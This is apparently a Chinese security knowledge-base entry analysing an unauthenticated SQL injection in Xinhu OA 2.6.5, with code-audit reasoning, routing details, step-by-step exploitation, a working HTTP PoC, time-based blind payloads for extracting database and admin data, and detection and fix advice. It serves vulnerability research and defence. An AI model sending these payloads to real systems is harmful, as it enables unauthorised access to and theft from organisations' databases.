---
id: web-generic-sqli-xinhu-kqjcmd-savefingerprint-openkqj-unauth
title: 信呼OA 2.6.5 前台 SQL 注入：openkqjAction 重写 initAction 绕过 openkey，ccid 直拼 kqjcmdModel::savefingerprint
type: scenario
domain: web
path: web/generic/sqli
technique: xinhu-kqjcmd-savefingerprint-openkqj-unauth-sqli
tags:
- sqli
- php
- xinhu
- oa
- unauth
- time-based-blind
- code-audit
- routing
cve: []
severity: critical
confidence: high
status: draft
affected_versions: 信呼OA 2.6.5（原文源码目录为 xinhu_2.6.5；未给修复版本）
created: '2026-11-07'
updated: '2026-11-07'
url: /docs/web/generic/sqli/web-generic-sqli-xinhu-kqjcmd-savefingerprint-openkqj-unauth/
draft: false
kb_aliases:
- 信呼OA SQL 注入
- xinhu savefingerprint SQLi
- openkqjAction 未授权
- kqjcmdModel 注入
- ccid 时间盲注
- openapiAction initAction 绕过
---

## 一句话结论

信呼OA 2.6.5 的 `webmain/task/openapi/openkqjAction.php` 重写了 `initAction()`，跳过父类 `openapiAction` 的 openkey 校验却仍调用 `getpostdata()` 读取原始 body；数据经 `kqjcmdModel::postdata()` 进入 `savefingerprint($snid, $uid, $finge)` 后，`$uid`（JSON 中的 `ccid`）被直接拼进 `where = "\`snid\`='$snid' and \`uid\`='$uid'"`，`$snid` 已做 int 转换，因此未登录即可通过 `ccid` 做时间盲注。

## 原理

- **路由与文件加载**：入口 `index.php` 取 `m`、`d`、`a` 后交给 `include/View.php`。`$m` 支持 `xxx|yyy` 形式：`View.php` 用 `|` 拆成 `$m`（控制器名）和 `$_m`（子目录名），分别拼出 `webmain/<d>/<$_m>/<$_m>Action.php` 与 `webmain/<d>/<$_m>/<m>Action.php`。请求 `?a=api&m=openkqj|openapi&d=task` 时，会先包含父类 `webmain/task/openapi/openapiAction.php`，再包含 `webmain/task/openapi/openkqjAction.php`，实例化 `openkqjClassAction` 并调用 `apiAction()`（`ajaxbool=true` 时则调用 `apiAjax()`）。
- **`/post` 的作用**：`View.php` 把 `REQUEST_URI` 按 `/` 拆分后取最后一段、再按 `?` 取 `$act`。在 URL 末尾加 `/post` 可让 `$act='post'`，满足 `openkqjClassAction::apiAction()` 里的 `if($act=='post' && $this->postdata!='')` 分支，才会调用 `m('kqjcmd')->postdata($this->snid, $this->postdata)`。
- **鉴权绕过**：`openapiAction extends ActionNot`，其 `initAction()` 先做 openkey 校验（仅在 `keycheck` 为真、Host 不是 127.0.0.1 且不含 `192.168`、openkey 非空时比较 `md5($openkey)`），然后调用 `getpostdata()`。`openkqjAction` 继承 `openapiAction` 后重写了 `initAction()`（重写体只调用 `getpostdata()`，不再执行 openkey 校验），且没有走 `apiAction` 的 token/登录校验链，因此该接口可未授权访问。
- **body 读取**：`openapiAction::getpostdata()` 优先取 `$GLOBALS['HTTP_RAW_POST_DATA']`，为空时用 `trim(file_get_contents('php://input'))`。因此请求需使用 `Content-Type: application/json`，让原始 JSON 进入 `$this->postdata`，而不是被 PHP 解析进 `$_POST`。
- **数据流与 Sink**：`kqjcmdModel::postdata($snid, $dstr)` 对 body 做 `json_decode($dstr, true)`，遍历数组，取 `$dtype = arrvalue($rs, 'data')`；当 `$dtype == 'fingerprint'` 时调用 `$this->savefingerprint($snid, $rs['ccid'], $rs['fingerprint'])`。`savefingerprint($snid, $uid, $finge)` 中：
  ```php
  $where = "`snid`='$snid' and `uid`='$uid'";
  ...
  if($this->kquobj->rows($where)==0){ ... }
  ```
  `$uid` 未转义、未参数化，直接进入 `rows()` 的 WHERE 子句，构成 SQL 注入；`$snid` 来自 `get('sn')` 后经 `(int)` 强制转换，不可注入。
- **为什么全局过滤没拦住**：信呼的 `$rock->get()`/`jmuncode()` 会过滤引号、空白和 SQL 关键字，但 `ccid` 来自 `php://input` 的 JSON 原文，不经过 `get()`/`post()` 封装；同时 JSON 需要两层嵌套（外层键任意，如 `b`；内层对象含 `data`、`ccid`、`fingerprint`），`foreach($barr as $k=>$rs)` 与 `arrvalue($rs,'data')` 才能命中 `fingerprint` 分支。
- **利用面**：`uid='$uid'` 是字符串上下文，可用 `'` 闭合后接 `OR SLEEP()`、`AND IF()`、`UNION` 等；`rows()` 只用于判断记录是否存在，页面不一定回显查询结果，优先时间/布尔盲注。原文请求中 `ccid` 为 `a' or sleep(3)#'` 时，响应触发 `kqjcmdModel.php` 第 281 行 `Undefined index: id` 的 Notice，说明 SQL 已执行并返回空集。

## 触发条件

- 目标为信呼OA 2.6.5（或存在相同 `openkqjAction`/`kqjcmdModel` 代码的版本），`webmain/task/openapi/openkqjAction.php` 可访问。
- `openkqjAction::initAction()` 仍为重写版本且未做 openkey/登录校验；`openapiAction::getpostdata()` 可读取 `php://input`。
- `sn` 参数对应的设备号在 `kqjsn` 表中存在（原文测试环境用 `sn=1`；`$snid` 由 `(int)$dbs->getmou('id', "\`num\`='$num'")` 得到，不存在时可能提前返回）。
- 数据库为 MySQL，支持 `SLEEP()`/`IF()`/`UNION` 等；请求需 `Content-Type: application/json`。
- 仅用于授权测试；时间盲注会拖慢请求，注意控制并发。

## 利用步骤

1. 审计/定位：确认 `webmain/task/openapi/openkqjAction.php` 的 `initAction()` 是否为空或只调用 `getpostdata()`，并确认 `openapiAction::initAction()` 的 openkey 校验被绕过。
2. 构造路由：`/index.php?a=api&m=openkqj|openapi&d=task&sn=<有效设备号>&/post`；`|` 在 URL 中可编码为 `%7C`，末尾 `/post` 用于让 `$act='post'`。
3. 设置 `Content-Type: application/json`，body 使用两层 JSON：`{"b":{"data":"fingerprint","ccid":"<payload>","fingerprint":"xx"}}`；外层键名任意，内层必须有 `data`、`ccid`、`fingerprint`。
4. 先用时间盲注验证：`ccid` 传 `a' or sleep(2)#'`，对比不带 `sleep` 的请求响应时间；若响应明显延迟，说明 WHERE 注入成立。
5. 用 `IF()` 与 `SUBSTR()` 逐字符提取数据库名、表名与管理员字段；例如 `a' or if(ascii(substr((select database()),1,1))>64,sleep(2),0)#'`。
6. 若页面/Notice 回显查询字段，可尝试 `UNION SELECT` 直接回显；否则继续时间/布尔盲注。
7. 记录请求报文、响应时间与 Notice 作为证据；测试结束清理测试数据（`savefingerprint` 在记录不存在时会执行 `record($arr,$where)` 插入，可能写入测试指纹记录）。

## PoC

原文请求（Cookie 可省略，接口本身未授权；`sn=1` 为原文测试值）：

```http
POST /index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post HTTP/1.1
Host: xinhu:8087
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/json
Content-Length: 73

{"b":{"data":"fingerprint","ccid":"a' or sleep(2)#'","fingerprint":"xx"}}
```

说明：

- `m=openkqj|openapi` 对应 `webmain/task/openapi/openkqjAction.php` 与父类 `openapiAction.php`；`a=api` 调用 `apiAction()`；`/post` 使 `$act='post'`。
- `ccid` 是 `savefingerprint` 的第二个参数 `$uid`，直接拼入 `uid` 字段；`snid` 为 int，不能注入。
- 原文响应出现 `Notice: Undefined index: id in ...\kqjcmdModel.php on line 281` 与 `{"status":1,"info":"ok","data":[null]}`，可作为代码路径已到达 Sink 的旁证；实际延时需在目标环境测量。

时间盲注变体：

```text
ccid = a' or if(ascii(substr((select database()),1,1))>64,sleep(2),0)#'
ccid = a' or if((select count(*) from `admin`)>0,sleep(2),0)#'
```

## 变体与关联

- **参数变体**：`ccid` 是第二条调用链的可控参数；第一条调用链的 `$clarr` 来自数据库查询结果，不可控。`fingerprint` 字段只作为待插入数据，不是注入点。
- **同产品其他注入**：[[web-generic-sqli-xinhu-setwxqy-base64-mobile-getone]]（`loginAction::setwxqyAction` 对 base64decode 后的 shouji/userid 拼 `getone`）、[[web-generic-sqli-xinhu-base64-filter-bypass-admin-actions]]（后台 inputAction/tableAction 的 base64 参数绕过全局过滤）、[[web-generic-auth-xinhu-logincheck-empty-inheritance-bypass]]（`ActionNot::logincheck` 空实现导致的 login/api 免登录）。本条与它们的根因相似（过滤顺序/继承链重写），但 Sink、路由、参数和版本均不同。
- **利用方式变体**：若 `rows()` 仅返回布尔值，用时间/布尔盲注；若后续 `record()` 或错误页回显字段，可尝试 UNION/报错注入；也可把 `ccid` 换成布尔条件枚举管理员数据。
- **审计扩展**：全局搜索 `->kquobj->rows($where)`、`savefingerprint(`、`postdata(` 等拼接点，重点看从 `php://input`/JSON 原文取值且未经 `intval`/转义的参数。

## 检测与防御

- **检测**：监控 `/index.php` 上 `m` 含 `|`、`d=task`、路径以 `/post` 结尾且 `Content-Type: application/json` 的异常请求；对 JSON body 中 `ccid` 等字段出现单引号、`sleep(`、`if(`、`substr(`、`union` 等高危片段告警；关注 `kqjcmdModel.php` 第 281 行附近的 Notice/错误日志突增与响应时间异常。
- **代码修复**：`savefingerprint` 的 WHERE 改为参数化/预处理，或对 `$uid` 做 `intval`/白名单校验（若业务上 uid 为数字）；`rows()`/`record()` 统一走参数绑定；`openkqjAction::initAction()` 恢复 openkey 校验，或在 `getpostdata()` 前统一做登录/签名校验。
- **架构防御**：不要依赖 `$rock->get()` 的字符过滤作为 SQL 注入防线；对 JSON 原文入口做统一 schema 校验；限制未授权 openapi 路由的暴露面。
- **应急**：若发现被利用，检查 `kqjcmd`/指纹相关表是否被写入异常记录，审计访问日志中上述路由与恶意 `ccid`，轮换 openkey 并升级到修复版本。
